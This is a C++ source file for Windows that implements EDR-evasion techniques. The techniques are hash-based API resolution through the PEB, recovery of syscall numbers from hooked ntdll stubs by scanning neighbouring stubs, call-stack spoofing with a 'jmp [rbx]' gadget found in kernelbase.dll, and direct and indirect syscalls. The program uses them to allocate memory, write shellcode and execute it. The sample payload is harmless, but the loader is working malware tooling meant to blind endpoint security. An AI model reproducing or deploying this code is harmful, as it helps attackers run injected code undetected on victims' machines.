#include <windows.h>
#include <iostream>

typedef struct _UNICODE_STRING
{
    USHORT Length;
    USHORT MaximumLength;
    _Field_size_bytes_part_opt_(MaximumLength, Length) PWCH Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef LONG NTSTATUS;

// PEB

typedef struct {
    ULONG Length;
    BOOLEAN Initialized;
    PVOID SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct {
    BYTE InheritedAddressSpace;
    BYTE ReadImageFileExecOptions;
    BYTE BeingDebugged;
    BYTE BitField;
    PVOID Mutant;
    PVOID ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
} PEB, *PPEB;

// Unwind

typedef enum _UNWIND_OP_CODES {
    UWOP_PUSH_NONVOL = 0, // 1 slot  : push rbx          -> +8 bytes
    UWOP_ALLOC_LARGE,     // 2-3 slots: sub rsp, 0x120    -> +nextSlot*8 (or +*(DWORD*)&nextSlot)
    UWOP_ALLOC_SMALL,     // 1 slot  : sub rsp, 0x30     -> +(OpInfo * 8 + 8) bytes
    UWOP_SET_FPREG,       // 1 slot  : Uses RBP frame ptr (we skip functions that use this)
    UWOP_SAVE_NONVOL,     // 2 slots : mov [rsp+X], rbx  -> +0 bytes (skip 1 extra slot)
    UWOP_SAVE_NONVOL_FAR, // 3 slots : mov [rsp+X], rbx  -> +0 bytes (skip 2 extra slots)
    UWOP_SAVE_XMM128 = 8, // 2 slots : movaps [rsp+X],xmm-> +0 bytes (skip 1 extra slot)
    UWOP_SAVE_XMM128_FAR, // 3 slots : movaps [rsp+X],xmm-> +0 bytes (skip 2 extra slots)
    UWOP_PUSH_MACHFRAME   // 1 slot  : Hardware interrupt (we skip this)
} UNWIND_OP_CODES;

typedef union _UNWIND_CODE {
    struct {
        BYTE CodeOffset;
        BYTE UnwindOp : 4;
        BYTE OpInfo   : 4;
    };
    USHORT FrameOffset;
} UNWIND_CODE, *PUNWIND_CODE;

typedef struct _UNWIND_INFO {
    BYTE        Version       : 3;
    BYTE        Flags         : 5;
    BYTE        SizeOfProlog;
    BYTE        CountOfCodes;
    BYTE        FrameRegister : 4;
    BYTE        FrameOffset   : 4;
    UNWIND_CODE UnwindCode[1];
} UNWIND_INFO, *PUNWIND_INFO;

// NT Function Templates

typedef NTSTATUS(NTAPI* fnNtAllocateVirtualMemory)(HANDLE ProcessHandle, 
    PVOID* BaseAddress, ULONG ZeroBits, PULONG RegionSize, 
    ULONG AllocationType, ULONG Protect);

typedef NTSTATUS(NTAPI* fnNtProtectVirtualMemory)(HANDLE ProcessHandle, 
    PVOID* BaseAddress, PSIZE_T NumberOfBytesToProtect, 
    ULONG NewAccessProtection, PULONG OldAccessProtection);

typedef NTSTATUS(NTAPI* fnNtWriteVirtualMemory)(HANDLE ProcessHandle, 
    PVOID BaseAddress, PVOID Buffer, SIZE_T NUmberOfBytesToWrite, 
    PSIZE_T NumberOfBytesWritten);

// Helper functions

DWORD HashStringDjb2(const char* str)
{
    ULONG hash = 5381;
    while(*str)
    {
        hash = ((hash << 5) + hash) + *str;
        str++;
    }
    return hash;
}

// Custom functions

HMODULE CustomGetModuleHandleA(const char* targetModuleName)
{
    ULONG64 pebAddress = __readgsqword(0x60);
    PPEB peb = (PPEB)pebAddress;
    PLIST_ENTRY listHead = &peb->Ldr->InLoadOrderModuleList;
    PLIST_ENTRY currEntry = listHead->Flink;
    while(currEntry != listHead)
    {
        PLDR_DATA_TABLE_ENTRY currLdrEntry = (PLDR_DATA_TABLE_ENTRY)currEntry;
        char* currModuleName = (char*)calloc(currLdrEntry->BaseDllName.Length, sizeof(char));
        wcstombs(currModuleName, currLdrEntry->BaseDllName.Buffer, currLdrEntry->BaseDllName.Length);
        if(!targetModuleName || !strcmpi(targetModuleName, currModuleName))
        {
            free(currModuleName);
            return (HMODULE)currLdrEntry->DllBase;
        }
        free(currModuleName);
        currEntry = currEntry->Flink;
    }
    return NULL;
}

FARPROC CustomGetProcAddressByDjb2Hash(HMODULE baseModule, DWORD targetFuncHash)
{
    BYTE* baseModuleAddress = (BYTE*)baseModule;
    PIMAGE_DOS_HEADER moduleImageDosHeader = (PIMAGE_DOS_HEADER)baseModuleAddress;
    PIMAGE_NT_HEADERS64 moduleNtHeaders = (PIMAGE_NT_HEADERS64)(baseModuleAddress + moduleImageDosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY moduleExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(baseModuleAddress + moduleNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD* nameRVAs = (DWORD*)(baseModuleAddress + moduleExportDirectory->AddressOfNames);
    WORD* ordinals = (WORD*)(baseModuleAddress + moduleExportDirectory->AddressOfNameOrdinals);
    DWORD* funcRVAs = (DWORD*)(baseModuleAddress + moduleExportDirectory->AddressOfFunctions);
    for(DWORD i = 0; i < moduleExportDirectory->NumberOfNames; i++)
    {
        const char* currFuncName = (const char*)(baseModuleAddress + nameRVAs[i]);
        if(targetFuncHash == HashStringDjb2(currFuncName))
        {
            return (FARPROC)(baseModuleAddress + funcRVAs[ordinals[i]]);
        }
    }
    return NULL;
}

BOOL ResolveSyscallEntry(BYTE* funcAddr, DWORD* outSsn, PVOID* outSyscallInstAddr)
{
    DWORD initOutSsn = *outSsn;
    if(funcAddr[0] == 0x4c && funcAddr[1] == 0x8b && funcAddr[2] == 0xd1 && funcAddr[3] == 0xb8)
    {
        *outSsn = *(WORD*)(funcAddr + 4);
    }
    if(funcAddr[0] == 0xe9 || funcAddr[3] == 0xe9)
    {
        printf("[!] WARNING: A hook was detected at: 0x%p\n", funcAddr);
        for(WORD idx = 0; idx < 500; idx++)
        {
            BYTE* downNeighbor = funcAddr + (idx * 0x20);
            if(downNeighbor[0] == 0x4c && downNeighbor[1] == 0x8b && downNeighbor[2] == 0xd1 && downNeighbor[3] == 0xb8)
            {
                WORD neighborSsn = *(WORD*)(downNeighbor + 4);
                *outSsn = neighborSsn - idx;
                break;
            }
            BYTE* upNeighbor = funcAddr - (idx * 0x20);
            if(upNeighbor[0] == 0x4c && upNeighbor[1] == 0x8b && upNeighbor[2] == 0xd1 && upNeighbor[3] == 0xb8)
            {
                WORD neighborSssn = *(WORD*)(upNeighbor + 4);
                *outSsn = neighborSssn + idx;
                break;
            }
        }
    }
    for(WORD i = 0; i < 32; i++)
    {
        if(funcAddr[i] == 0x0f && funcAddr[i+1] == 0x05 && funcAddr[i+2] == 0xc3)
        {
            *outSyscallInstAddr = &funcAddr[i];
            break;
        }
    }
    if(initOutSsn == *outSsn)
    {
        return FALSE;
    }
    return TRUE;
}

BOOL CalculateFunctionStackSize(BYTE* moduleBase, PRUNTIME_FUNCTION rtFunc, DWORD* outStackSize)
{
    PUNWIND_INFO unwindInfo = (PUNWIND_INFO)(moduleBase + rtFunc->UnwindData);
    if((unwindInfo->Flags & UNW_FLAG_CHAININFO) != 0 || unwindInfo->FrameRegister != 0)
    {
        return FALSE;
    }
    DWORD totalStackSize = 0;
    for(DWORD i = 0; i < unwindInfo->CountOfCodes; i++)
    {
        BYTE unwindOp = unwindInfo->UnwindCode[i].UnwindOp;
        BYTE opInfo = unwindInfo->UnwindCode[i].OpInfo;

        switch(unwindOp)
        {
            case UWOP_PUSH_NONVOL: // e.g. push rbx (+8 bytes)
                totalStackSize += 8;
                break;
            case UWOP_ALLOC_SMALL: // e.g. sub rsp, 0x30
                totalStackSize += (opInfo * 8) + 8;
                break;
            case UWOP_ALLOC_LARGE: // e.g. sub rsp, 0x120
                if(opInfo == 0)
                {
                    totalStackSize += unwindInfo->UnwindCode[i + 1].FrameOffset * 8;
                    i += 1;
                }
                else {
                    totalStackSize += *(DWORD*)(&unwindInfo->UnwindCode[i + 1]);
                    i += 2;
                }
                break;
            case UWOP_SAVE_NONVOL: // e.g. mov [rsp+0x20], rbx
            case UWOP_SAVE_XMM128:
                i += 1;
                break;
            case UWOP_SAVE_NONVOL_FAR:
            case UWOP_SAVE_XMM128_FAR:
                i += 2;
                break;
            default: // UWOP_SET_FPREG or UWOP_PUSH_MACHFRAME
                return FALSE;
        }
    }
    *outStackSize = totalStackSize;
    return TRUE;
}

BOOL FindGadgetInModule(HMODULE hModule, PVOID* outGadgetAddr, DWORD* outGadgetFrameSize)
{
    BYTE* moduleBase = (BYTE*)hModule;
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)(moduleBase + dosHeader->e_lfanew);
    IMAGE_DATA_DIRECTORY exceptionDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
    PRUNTIME_FUNCTION rtFuncs = (PRUNTIME_FUNCTION)(moduleBase + exceptionDir.VirtualAddress);
    DWORD numFuncs = exceptionDir.Size / sizeof(RUNTIME_FUNCTION);

    for(DWORD i = 0; i < numFuncs; i++)
    {
        DWORD frameSize = 0;
        if(!CalculateFunctionStackSize(moduleBase, &rtFuncs[i], &frameSize))
        {
            continue;
        }
        if(frameSize < 0x48)
        {
            continue;
        }
        // Scanning the module's machine code to find jmp qword ptr [rbx]
        // instruction
        PUNWIND_INFO unwindInfo = (PUNWIND_INFO)(moduleBase + rtFuncs[i].UnwindData);
        for(DWORD rva = rtFuncs[i].BeginAddress + unwindInfo->SizeOfProlog; rva < rtFuncs[i].EndAddress - 2; rva++)
        {
            if(moduleBase[rva] == 0xFF && moduleBase[rva + 1] == 0x23)
            {
                *outGadgetAddr = (PVOID)(moduleBase + rva);
                *outGadgetFrameSize = frameSize;
                return TRUE;
            }
        }
    }
    return FALSE;
}

// Extern functions

extern "C" VOID PrepareSpoofedSyscall(DWORD ssn, PVOID syscallInstructionAddr, PVOID gadgetAddr, DWORD gadgetFrameSize);
extern "C" NTSTATUS DoDirectSyscall(...);
extern "C" NTSTATUS DoSpoofedIndirectSyscall(...);

int main()
{
    HMODULE hNtdll = CustomGetModuleHandleA("ntdll.dll");
    fnNtAllocateVirtualMemory NtAllocateVirtualMemory = (fnNtAllocateVirtualMemory)CustomGetProcAddressByDjb2Hash(hNtdll, 0x6793c34c);
    fnNtProtectVirtualMemory NtProtectVirtualMemory = (fnNtProtectVirtualMemory)CustomGetProcAddressByDjb2Hash(hNtdll, 0x082962c8);
    fnNtWriteVirtualMemory NtWriteVirtualMemory = (fnNtWriteVirtualMemory)CustomGetProcAddressByDjb2Hash(hNtdll, 0x95f3a792);
    printf("[!] NT functions resolved successfully.\n");
    HMODULE hKernelBase = CustomGetModuleHandleA("kernelbase.dll");
    PVOID gadgetAddr;
    DWORD gadgetFrameSize;
    BOOL boolRet = FindGadgetInModule(hKernelBase, &gadgetAddr, &gadgetFrameSize);
    if(!boolRet)
    {
        printf("[-] Couldn't find a gadget in KernelBase.dll.\n");
        return 1;
    }
    printf("[+] Found a gadget in KernelBase.dll at 0x%p with stack size 0x%X\n", gadgetAddr, gadgetFrameSize);
    printf("[+] NtAllocateVirtualMemory first 8 bytes before the EDR hook: ");
    BYTE* baseNtAllocateVirtualMemory = (BYTE*)NtAllocateVirtualMemory;
    BYTE* baseNtWriteVirtualMemory = (BYTE*)NtWriteVirtualMemory;
    BYTE* baseNtProtectVirtualMemory = (BYTE*)NtProtectVirtualMemory;
    for(int i = 0; i < 8; i++)
    {
        printf("%X ", baseNtAllocateVirtualMemory[i]);
    }
    printf("\n[!] Patching first 5 bytes of NtAllocateVirtualMemory.\n");
    SIZE_T numberOfBytesToProtect = 32;
    ULONG oldAccessProtection = NULL;
    BYTE* protectBuffer = baseNtAllocateVirtualMemory;
    NTSTATUS ntStatus = NtProtectVirtualMemory((HANDLE)-1, (PVOID*)&protectBuffer, &numberOfBytesToProtect, PAGE_EXECUTE_READWRITE, &oldAccessProtection);
    if(ntStatus != 0x00000000)
    {
        printf("[-] Unexpected: NtProtectVirtualMemory returned: 0x%08X\n", ntStatus);
        return 1;
    }
    baseNtAllocateVirtualMemory[0] = 0xE9;
    baseNtAllocateVirtualMemory[1] = 0xAA;
    baseNtAllocateVirtualMemory[2] = 0xBB;
    baseNtAllocateVirtualMemory[3] = 0xCC;
    baseNtAllocateVirtualMemory[4] = 0xDD;
    ntStatus = NtProtectVirtualMemory((HANDLE)-1, (PVOID*)&protectBuffer, &numberOfBytesToProtect, PAGE_EXECUTE_READ, &oldAccessProtection);
    if(ntStatus != 0x00000000)
    {
        printf("[-] Unexpected: NtProtectVirtualMemory returned: 0x%08X\n", ntStatus);
        return 1;
    }
    printf("[+] Patched successfully. The first 8 bytes of NtAllocateVirtualMemory after patch: ");
    for(int i = 0; i < 8; i++)
    {
        printf("%X ", baseNtAllocateVirtualMemory[i]);
    }
    printf("\n[!] Resolving SSNs for NT functions.\n");
    DWORD ssnNtAllocateVirtualMemory = -1;
    DWORD ssnNtProtectVirtualMemory = -1;
    DWORD ssnNtWriteVirtualMemory = -1;
    PVOID legitimateInstrAddrNtAllocateVirtualMemory;
    PVOID legitimateInstrAddrNtProtectVirtualMemory;
    PVOID legitimateInstrAddrNtWriteVirtualMemory;
    ResolveSyscallEntry(baseNtAllocateVirtualMemory, &ssnNtAllocateVirtualMemory, &legitimateInstrAddrNtAllocateVirtualMemory);
    ResolveSyscallEntry(baseNtWriteVirtualMemory, &ssnNtWriteVirtualMemory, &legitimateInstrAddrNtWriteVirtualMemory);
    ResolveSyscallEntry(baseNtProtectVirtualMemory, &ssnNtProtectVirtualMemory, &legitimateInstrAddrNtProtectVirtualMemory);
    if(ssnNtAllocateVirtualMemory == -1 || ssnNtProtectVirtualMemory == -1 || ssnNtWriteVirtualMemory == -1)
    {
        printf("[-] Couldn't recover SSNs for the functions, NtAllocateVirtualMemory: 0x%X NtProtectVirtualMemory: 0x%X NtWriteVirtualMemory: 0x%X\n", ssnNtAllocateVirtualMemory, ssnNtProtectVirtualMemory, ssnNtWriteVirtualMemory);
        return 1;
    }
    printf("[+] Recovered SSN for the NtAllocateVirtualMemory: 0x%X and syscall gadget address: 0x%p, NtProtectVirtualMemory: 0x%X and syscall gadget address: 0x%p, NtWriteVirtualMemory: 0x%X and syscall gadget address(not used for direct syscall): 0x%p\n", ssnNtAllocateVirtualMemory, legitimateInstrAddrNtAllocateVirtualMemory, ssnNtProtectVirtualMemory, legitimateInstrAddrNtProtectVirtualMemory, ssnNtWriteVirtualMemory, legitimateInstrAddrNtWriteVirtualMemory);
    PVOID baseAllocatedAddress = NULL;
    SIZE_T regionSize = 4096;
    printf("[!] Making the indirect syscall for NtAllocateVirtualMemory.\n");
    PrepareSpoofedSyscall(ssnNtAllocateVirtualMemory, legitimateInstrAddrNtAllocateVirtualMemory, gadgetAddr, gadgetFrameSize);
    ntStatus = DoSpoofedIndirectSyscall((HANDLE)-1, &baseAllocatedAddress, 0, &regionSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if(ntStatus != 0x00000000)
    {
        printf("[-] Unexpected: Spoofed indirect syscall for NtAllocateVirtualMemory returned: 0x%08X\n", ntStatus);
        return 1;
    }
    printf("[+] Spoofed indirect syscall successful, copying payload with direct syscall and protecting the allocated memory.\n");
    const char payload[] = "\xB8\x39\x05\x00\x00\xC3";
    PrepareSpoofedSyscall(ssnNtWriteVirtualMemory, legitimateInstrAddrNtWriteVirtualMemory, gadgetAddr, gadgetFrameSize);
    SIZE_T numberOfBytesWritten = 0;
    ntStatus = DoDirectSyscall((HANDLE)-1, baseAllocatedAddress, (PVOID)payload, sizeof(payload), &numberOfBytesWritten);
    if(ntStatus != 0x00000000)
    {
        printf("[-] Unexpected: Direct syscall for NtWriteVirtualMemory returned: 0x%08X\n", ntStatus);
        return 1;
    }
    //memcpy(baseAllocatedAddress, payload, sizeof(payload));
    PrepareSpoofedSyscall(ssnNtProtectVirtualMemory, legitimateInstrAddrNtProtectVirtualMemory, gadgetAddr, gadgetFrameSize);
    ntStatus = DoSpoofedIndirectSyscall((HANDLE)-1, &baseAllocatedAddress, &regionSize, PAGE_EXECUTE_READ, &oldAccessProtection);
    if(ntStatus != 0x00000000)
    {
        printf("[-] Unexpected: Spoofed indirect syscall for NtProtectVirtualMemory returned: 0x%08X\n", ntStatus);
        return 1;
    }
    printf("[+] Copied the payload and protected allocated memory successfully. Triggering execution.\n");
    typedef int (*fnShellcode)();
    fnShellcode Shellcode = (fnShellcode)baseAllocatedAddress;
    int ret = Shellcode();
    printf("[+] Shellcode function returned: %d\n", ret);
    printf("[!] Restoring NtAllocateVirtualMemory hook.\n");
    ntStatus = NtProtectVirtualMemory((HANDLE)-1, (PVOID*)&protectBuffer, &numberOfBytesToProtect, PAGE_EXECUTE_READWRITE, &oldAccessProtection);
    if(ntStatus != 0x00000000)
    {
        printf("[-] Unexpected: NtProtectVirtualMemory returned: 0x%08X\n", ntStatus);
        return 1;
    }
    baseNtAllocateVirtualMemory[0] = 0x4c;
    baseNtAllocateVirtualMemory[1] = 0x8b;
    baseNtAllocateVirtualMemory[2] = 0xd1;
    baseNtAllocateVirtualMemory[3] = 0xb8;
    baseNtAllocateVirtualMemory[4] = 0x18;
    ntStatus = NtProtectVirtualMemory((HANDLE)-1, (PVOID*)&protectBuffer, &numberOfBytesToProtect, PAGE_EXECUTE_READ, &oldAccessProtection);
    if(ntStatus != 0x00000000)
    {
        printf("[-] Unexpected: NtProtectVirtualMemory returned: 0x%08X\n", ntStatus);
        return 1;
    }
    printf("[+] Restored NtAllocateVirtualMemory hook.\n");
    getchar();
    return 0;
}